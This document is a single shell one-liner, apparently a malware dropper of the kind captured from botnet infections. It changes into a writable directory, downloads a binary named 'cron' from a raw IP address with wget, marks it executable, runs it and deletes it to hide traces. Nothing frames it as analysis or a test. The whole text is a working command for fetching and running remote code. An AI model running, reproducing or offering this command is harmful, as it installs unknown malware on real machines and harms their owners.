cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.170.85/cron; chmod +x cron; ./cron; rm -rf cron
